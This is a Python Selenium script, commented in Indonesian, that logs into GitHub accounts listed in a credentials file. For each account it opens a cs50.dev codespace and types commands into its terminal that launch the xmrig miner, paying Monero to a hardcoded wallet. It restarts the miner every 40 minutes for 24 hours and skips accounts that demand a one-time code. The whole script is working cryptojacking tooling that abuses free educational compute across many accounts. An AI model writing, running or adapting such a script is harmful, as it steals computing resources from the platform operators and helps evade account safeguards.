import time
import os
import imaplib
import email
from email.header import decode_header
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from dotenv import load_dotenv

# Muat kredensial dari file .env
load_dotenv()

IMAP_USERNAME = os.getenv("IMAP_USERNAME")
IMAP_PASSWORD = os.getenv("IMAP_PASSWORD")

# Fungsi untuk membaca akun GitHub dari file github.txt
def read_github_accounts(file_path="github.txt"):
    with open(file_path, "r") as file:
        accounts = file.readlines()
    return [account.strip().split(":") for account in accounts]

# Fungsi untuk membersihkan subjek email
def clean_subject(subject):
    decoded = decode_header(subject)
    return ''.join(
        part.decode(encoding if encoding else 'utf-8')
        if isinstance(part, bytes) else part
        for part, encoding in decoded
    )

# Fungsi untuk menjalankan perintah di terminal browser
def perform_terminal_actions(driver, x, y):
    actions = ActionChains(driver)

    # Klik koordinat terminal
    actions.move_by_offset(x, y).click().perform()
    time.sleep(1)  # Tunggu 1 detik

    # Ketik perintah pertama
    actions.send_keys("cd mymy && cd xmrig-6.21.1").send_keys(Keys.RETURN).perform()
    time.sleep(1)  # Tunggu 1 detik

    # Ketik perintah kedua
    actions.send_keys("./xmrig -a rx -o stratum+ssl://rx-eu.unmineable.com:443 -u XMR:88nwwZdT8SJAXunhysmJsYHTdFkvvhrZSARPXddvmHLrWw7bzF7XpRpVXUKt3cvnQAY41bJwYVi9a7CPMqHazH9FL81a7Rn.codespace -p x").send_keys(Keys.RETURN).perform()
    time.sleep(3)  # Tunggu 3 detik

# Fungsi untuk pengulangan setiap 40 menit
def repeat_actions(driver, x, y, duration=24*60*60):
    start_time = time.time()
    while time.time() - start_time < duration:
        print("Menunggu 40 menit...")
        time.sleep(40 * 60)

        # Klik pada koordinat dan kirimkan Ctrl+C
        actions = ActionChains(driver)
        actions.move_by_offset(x, y).click().key_down(Keys.CONTROL).send_keys("c").key_up(Keys.CONTROL).perform()
        time.sleep(3)

        # Ketik ulang perintah kedua
        actions.send_keys("./xmrig -a rx -o stratum+ssl://rx-eu.unmineable.com:443 -u XMR:88nwwZdT8SJAXunhysmJsYHTdFkvvhrZSARPXddvmHLrWw7bzF7XpRpVXUKt3cvnQAY41bJwYVi9a7CPMqHazH9FL81a7Rn.codespace -p x").send_keys(Keys.RETURN).perform()

# Fungsi login dan eksekusi tindakan di GitHub dan cs50.dev
def login_to_github(username, password):
    options = webdriver.ChromeOptions()
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)

    try:
        # Kunjungi halaman login GitHub
        driver.get('https://github.com/login')

        # Tunggu hingga kolom username tersedia
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "login_field"))
        )

        # Temukan kolom username dan isi
        username_field = driver.find_element(By.ID, "login_field")
        username_field.send_keys(username)

        # Temukan kolom password dan isi
        password_field = driver.find_element(By.ID, "password")
        password_field.send_keys(password)

        # Temukan tombol Submit dan tekan
        submit_button = driver.find_element(By.NAME, "commit")
        submit_button.click()

        # Tunggu beberapa saat untuk memeriksa apakah kolom OTP muncul
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "otp"))
            )
            print(f"Kolom OTP muncul untuk akun {username}. Silakan menunggu OTP.")
            return
        except:
            # Jika kolom OTP tidak muncul, langsung lanjutkan
            print("Tidak ada kolom OTP yang diminta, langsung mengunjungi cs50.dev...")

        # Setelah berhasil login, kunjungi cs50.dev
        driver.get("https://cs50.dev")

        # Tunggu hingga halaman cs50.dev dimuat sepenuhnya
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )
        print("Halaman cs50.dev berhasil dimuat.")

        # Temukan tombol "Log In" di halaman cs50.dev dan klik
        login_button = driver.find_element(By.XPATH, "//form[@action='/open']//button")
        login_button.click()
        print("Tombol 'Log In' berhasil ditekan untuk akun.")

        # Tunggu 10 menit
        print("Menunggu 10 menit...")
        time.sleep(10 * 60)

        # Koordinat terminal di browser
        terminal_x, terminal_y = 100, 100  # Ganti dengan koordinat terminal

        # Lakukan tindakan terminal
        perform_terminal_actions(driver, terminal_x, terminal_y)

        # Ulangi tindakan setiap 40 menit hingga 24 jam selesai
        repeat_actions(driver, terminal_x, terminal_y)

    finally:
        # Sebelum driver selesai, kirimkan Ctrl+C terakhir
        actions = ActionChains(driver)
        actions.move_by_offset(terminal_x, terminal_y).click().key_down(Keys.CONTROL).send_keys("c").key_up(Keys.CONTROL).perform()
        driver.quit()
        print(f"Driver ditutup setelah 24 jam.")

# Main function untuk login ke setiap akun GitHub yang ada
def main():
    accounts = read_github_accounts()  # Baca akun dari github.txt
    for username, password in accounts:
        login_to_github(username, password)  # Login untuk setiap akun

# Jalankan main function
if __name__ == "__main__":
    main()
